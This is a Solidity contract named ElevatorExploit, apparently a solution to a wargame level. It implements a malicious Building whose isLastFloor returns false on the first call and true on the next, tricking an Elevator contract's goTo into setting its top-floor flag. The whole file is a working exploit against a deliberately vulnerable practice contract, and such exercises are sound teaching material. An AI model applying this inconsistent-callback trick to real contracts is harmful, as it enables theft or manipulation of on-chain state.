// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorExploit is Building {
    bool private isFirstCall = true;
    address private immutable elevator;
    
    constructor(address _elevator) public {
        elevator  = _elevator;
    }

    function exploit() external {
        Elevator(elevator).goTo(type(uint256).max);
    }
    
    function isLastFloor(uint256 floor)
        external
        override
        returns (bool)
    {
        if (isFirstCall) {
            isFirstCall = false;
            return false;
        } else {
            return true;
        }
    }
}
